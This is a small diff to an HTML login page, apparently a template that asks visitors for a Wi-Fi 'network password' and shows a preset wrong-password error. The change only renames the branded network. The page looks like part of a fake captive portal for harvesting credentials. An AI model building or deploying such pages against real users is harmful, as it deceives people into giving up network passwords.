@@ -127,7 +127,7 @@
 
         <div id="content-area">
             <h1>Log In</h1>
-            <p class="subtitle">Enter your network password to continue to <b>NameCorporation</b></p>
+            <p class="subtitle">Enter your network password to continue to <b>WIFINameCorporation</b></p>
             
             <div id="error-msg">Incorrect password. Please try again.</div>
 
